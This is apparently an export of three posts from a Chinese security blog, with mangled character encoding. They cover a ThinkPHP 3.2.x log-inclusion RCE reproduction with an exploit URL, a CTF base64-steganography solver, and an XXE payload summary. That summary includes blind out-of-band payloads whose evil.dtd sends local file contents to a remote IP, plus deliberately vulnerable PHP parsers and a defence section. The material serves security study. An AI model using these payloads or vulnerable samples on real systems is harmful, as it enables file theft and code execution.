<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($value=<span class="string">''</span>)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;assign($value);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;display();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¯¥æ¼æ´åˆ©ç”¨çš„assignå‡½æ•°éœ€è¦æ¨¡æ¿æ¸²æŸ“ï¼Œæ‰€ä»¥éœ€è¦å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶ï¼Œä¸demoç›¸å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ï¼š</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\H</span>ome<span class="symbol">\V</span>iew<span class="symbol">\I</span>ndex<span class="symbol">\i</span>ndex.html</span><br><span class="line">/*æ­¤å¤„çš„Indexç›®å½•å’Œindex.htmlæ–‡ä»¶éœ€è‡ªå·±åˆ›å»º</span><br><span class="line">index.htmlçš„å†…å®¹ä»»æ„</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å€Ÿç”¨ç„ç”²å®‰å…¨å®éªŒå®¤çš„ä¸€å¼ å›¾ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ç¨‹åºçš„æ‰§è¡Œæµç¨‹</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210909094308482.png" alt="image-20210909094308482"></p>
<p>æ¥ä¸‹æ¥åˆ†æå…·ä½“çš„ä»£ç ï¼š</p>
<p><code>Application/Home/Controller/IndexController.class.php</code></p>
<p>assignæ–¹æ³•ä¸­ç¬¬ä¸€ä¸ªå˜é‡å¯æ§</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714144552762.png" alt="image-20210714144552762"></p>
<p>è·Ÿè¿›assignå‡½æ•°</p>
<p><code>ThinkPHP/Library/Think/Controller.class.php</code></p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714145223478.png" alt="image-20210714145223478"></p>
<p>è°ƒç”¨çš„æ˜¯<code>ThinkPHP/Library/Think/View.class.php</code>ä¸­çš„assignå‡½æ•°ï¼Œæ­¤æ—¶è¿›å…¥elseåˆ†æ”¯ï¼Œæˆ‘ä»¬ä¼ è¿›å»çš„<code>$value</code>è¢«èµ‹å€¼ç»™<code>$this-&gt;tVar</code></p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714145158360.png" alt="image-20210714145158360"></p>
<p>è¿”å›åè¿›å…¥displayå‡½æ•°ï¼Œæ³¨æ„è¿™æ˜¯ä¸€ä¸ªæ— å‚è°ƒç”¨</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714145819669.png" alt="image-20210714145819669"></p>
<p>è°ƒç”¨çš„æ˜¯<code>ThinkPHP/Library/Think/View.class.php</code>çš„displayå‡½æ•°ï¼Œå¼€å§‹è§£æå¹¶è·å–æ¨¡æ¿æ–‡ä»¶å†…å®¹ï¼Œæ­¤æ—¶æ¨¡æ¿æ–‡ä»¶è·¯å¾„å’Œå†…å®¹ä¸ºç©º</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714150822344.png" alt="image-20210714150822344"></p>
<p>è¿›å…¥<code>ThinkPHP/Library/Think/View.class.php</code>çš„fetchå‡½æ•°åï¼Œä¼šå…ˆåˆ¤æ–­æ¨¡æ¿å­˜ä¸å­˜åœ¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦åˆ›å»ºæ¨¡æ¿æ–‡ä»¶çš„åŸå› </p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714151415868.png" alt="image-20210714151415868"></p>
<p>æ¥ç€åˆ¤æ–­æ˜¯ä¸æ˜¯phpç±»å‹æ¨¡æ¿ï¼Œä¸æ˜¯è¿›å…¥elseåˆ†æ”¯ã€‚æ¥ç€$params è¢«èµ‹å€¼ï¼Œvarå³ä¸ºä¸ºæˆ‘ä»¬ä¼ è¿›å»çš„æ—¥å¿—è·¯å¾„ï¼Œfileä¸ºæ¨¡æ¿æ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714151836840.png" alt="image-20210714151836840"></p>
<p>æ¥ç€è¿›å…¥<code>ThinkPHP/Library/Think/Hook.class.php</code>çš„listenå‡½æ•°ï¼Œç»è¿‡ä¸€äº›åˆ¤æ–­ï¼Œè¿›å…¥execå‡½æ•°</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714152708275.png" alt="image-20210714152708275"></p>
<p>æ¥ç€execå‡½æ•°æŠŠ$paramså¸¦è¿›<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>çš„runå‡½æ•°å¤„ç†</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714153315655.png" alt="image-20210714153315655"></p>
<p>è¿›å…¥<code>ThinkPHP/Library/Think/Template.class.php</code>çš„fetchå‡½æ•°</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714153522998.png" alt="image-20210714153522998"></p>
<p>è¿›å…¥æœ€åçš„loadå‡½æ•°ï¼Œ$varä¸ä¸ºç©ºåˆ™ä½¿ç”¨extractæ–¹æ³•çš„EXTR_OVERWRITEé»˜è®¤æè¿°å¯¹å˜é‡å€¼è¿›è¡Œè¦†ç›–ï¼Œä¹‹åincludeè¯¥æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼Œé€ æˆæ–‡ä»¶åŒ…å«ã€‚</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714153704479.png" alt="image-20210714153704479"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><ul>
<li><p>æ—¥å¿—åŒ…å«</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714154206984.png" alt="image-20210714154206984"></p>
<p>æ—¥å¿—åœ¨<code>Application/Runtime/Logs/Home</code>ç›®å½•ä¸‹</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714154445495.png" alt="image-20210714154445495"></p>
<p>å¼€å¯debug</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ä¸æŠ¥é”™ æ—¥å¿—æ–‡ä»¶åœ¨ Application<span class="regexp">/Runtime/</span>Logs/Homeä¸‹</span><br><span class="line">è¯·æ±‚ä¼šæŠ¥é”™ æ—¥å¿—æ–‡ä»¶åœ¨ Application<span class="regexp">/Runtime/</span>Logs/Commonä¸‹</span><br></pre></td></tr></table></figure>

<p>å…³é—­debug</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ä¸ä¼šæŠ¥é”™ ä¸ä¼šè®°å½•æ—¥å¿—</span><br><span class="line">è¯·æ±‚ä¼šæŠ¥é”™ æ—¥å¿—æ–‡ä»¶åœ¨ Application/Runtime/Logs/<span class="meta">Common</span>ä¸‹</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>ä¸Šä¼ å…¥å£</p>
<p>åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ åŒ…å«shellçš„æ–‡ä»¶</p>
</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://x.x.x.x/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21<span class="emphasis">_07_</span>14.log</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210716163001792.png" alt="image-20210716163001792"></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ?st=529DABB1BC6F651382C9135EB552827AD43F0288831BAC943C5A6CE32F45F1B9F423FD767BD30EB98F9C2C6D962C1268BBC7A694FE6B1157BC89FD16D8EAEB81A3BD642BDC08DB57567E4C7B327B7134882308F36A811B338901B511ABC8BC487356659B2CD0C8417DBCFD448DE79A0E6611FC7DAA7F5F806AED95180ADE0D979653805D9BE2818C36432C242C346C258EB569D4B4EC38ACD08C5E03A09D4FAA34F60913522071EB3BEEED7BDB667730296BE92C3B10E13BA48209051A216A1E&vid=1688851206182100&cst=53928845F30E881CE4702F30E4E78E655B605169B1BF71E0E963E97B3C21D4A26131701E074B2422DE3B7150338D0234&deviceid=de960c8d-258f-4e7d-a333-c1e3dc351b70&version=3.1.8.3015&platform=win" target="_blank" rel="noopener">ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥</a> </p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>å¤ç°</tag>
        <tag>Thinkphp3</tag>
      </tags>
  </entry>
  <entry>
    <title>base64éšå†™</title>
    <url>/2019/12/base64%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è¿™ç§base64éšå†™ç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä½ ä¼šå¾—åˆ°ä¸€å¤§å †base64çš„å­—ç¬¦ä¸²ä½†å´æ— æ³•è§£ç ã€‚å†™è¿‡è¿™é¢˜å°±å¾ˆç®€å•ï¼Œä½†base64çš„åŸç†å€¼å¾—æˆ‘ä»¬å»ç ”ç©¶ä¸€ä¸‹ã€‚<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p><h2 id="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"><a href="#ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²" class="headerlink" title="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"></a>ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        ran_str = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">13</span>))</span><br><span class="line">        base64str = base64.b64encode(ran_str)</span><br><span class="line">        fp.write(base64str + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'Tr0y&#123;Base64isF4n&#125;'</span>  <span class="comment"># flag</span></span><br><span class="line">bin_str = <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f0, open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:  <span class="comment"># '0.txt'æ˜¯æ˜æ–‡, '1.txt'ç”¨äºå­˜æ”¾éšå†™åçš„ base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> len(bin_str):</span><br><span class="line">            offset = int(<span class="string">'0b'</span> + bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[len(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum * <span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 = <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])  <span class="comment"># 8 ä½ä¸€ç»„</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">githubæœ‰ä¸ªå·¥å…·</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jerrita/</span>b64steg</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ³¨å…¥æ€»ç»“</title>
    <url>/2019/12/XXE%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>XXEå³XML External Entity Injectionï¼Œç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„ã€‚ä¾‹å¦‚PHPä¸­çš„simplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“ï¼Œæœ‰XXEæ¼æ´çš„æ ‡å¿—æ€§å‡½æ•°ä¸ºsimplexml_load_stringï¼ˆï¼‰</em></p><p>è¿™é‡Œä¸»è¦æ˜¯è®°å½•ä¸€äº›Payload</p><a id="more"></a>

<p>å¦‚æœè¦è‡ªå·±å¤ç°çš„è¯ï¼Œå…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å®‰è£…php-xml</p>
<p><strong>ä¸€ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload:</em></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=./index.php"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191218212649252.png" alt="image-20191218212649252"></p>
<p>è¿™é‡Œä¸€èˆ¬ä¼šåˆ©ç”¨phpä¼ªåè®®è¿›è¡Œç¼–ç ï¼Œé˜²æ­¢æŸäº›ç‰¹æ®Šå­—ç¬¦å¯¼è‡´æŠ¥é”™</p>
<p><strong>äºŒã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219111929470.png" alt="image-20191219111929470"></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¯»å–çš„æ–‡ä»¶ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219112205187.png" alt="image-20191219112205187"></p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨zlibå‹ç¼©æ•°æ®æµ</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219194710329.png" alt="image-20191219194710329"></p>
<p><strong><em>decode.py</em></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //è§£å¯†çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥åˆ©ç”¨phpè§£å‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‹ç¼©ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"</span>);</span><br><span class="line">è§£å‹ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>ä¸‰ä¸¶SVGæ ¼å¼XXEæ³¨å…¥</strong></p>
<p>è¿™ä¸ªå§¿åŠ¿æ˜¯Google CTF 2019çš„<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">æŸé“é¢˜</a> è¿™é“é¢˜çš„<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (æ³¨æ„ç½‘ç»œ)å­¦åˆ°çš„</p>
<p><strong><em>svg.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219192450371.png" alt="image-20191219192450371"></p>
<p>è™½ç„¶æŠ¥äº†ä¸€å¤§å †é”™ä½†æ•°æ®å·²ç»å¸¦å‡ºæ¥äº†</p>
<p>åé¢å‘ç°ç›´æ¥ç”¨ç›²æ³¨çš„payloadä¹Ÿè¡Œ</p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191220233828942.png" alt="image-20191220233828942"></p>
<p><strong><em>å››ã€å„ç§å¹³å°ä¸Šæ”¯æŒåè®®</em></strong></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
<p><strong><em>äº”ã€HTTPå†…ç½‘ä¸»æœºæ¢æµ‹</em></strong></p>
<p>å°è¯•è¯»å–ç½‘ç»œé…ç½®æ–‡ä»¶</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225251465.png" alt="image-20191219225251465"></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225453109.png" alt="image-20191219225453109"></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219231126267.png" alt="image-20191219231126267"></p>
<p>ç„¶åé€šè¿‡BurpSuitçš„æµ‹è¯•å™¨å®Œæˆä¸»æœºå’Œç«¯å£æ¢æµ‹</p>
<p><strong>å…­ã€é˜²å¾¡XXE</strong></p>
<p><strong><em>PHPï¼š</em></strong></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">libxml_disable_entity_loader</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure>

<p><strong><em>JAVA:</em></strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="params">false</span>)</span></span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="params">false</span>)</span>;</span><br></pre></td></tr></table></figure>

<p><strong><em>Pythonï¼š</em></strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXEæ¼æ´åˆ†æ</a></p>
<p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>
]]></content>
